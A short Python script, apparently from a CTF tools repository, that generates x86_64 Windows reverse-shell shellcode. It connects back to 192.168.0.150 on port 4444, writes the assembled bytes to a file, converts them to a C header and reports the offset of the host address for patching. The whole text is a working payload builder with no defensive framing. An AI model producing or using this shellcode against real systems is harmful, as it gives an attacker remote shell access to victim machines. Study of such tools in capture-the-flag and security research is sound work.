# from https://github.com/niklasb/ctf-tools
from pwnlib.wintools import *
from pwnlib.tools import *

port = 4444
host = '192.168.0.150'

sc = ''
sc += code_align_stack64
sc += reverse_shell64(host, port)
sc += api_call_stub64

sc = x86_64.assemble(sc)
with open('/tmp/sc.bin', 'w') as f:
  f.write(sc)
assert 0 == os.system('xxd -i /tmp/sc.bin > /home/niklas/ctf/tmp/sc.h')

host_bin = ''.join(map(chr,map(int, host.split('.'))))
print 'host offset', sc.index(host_bin)
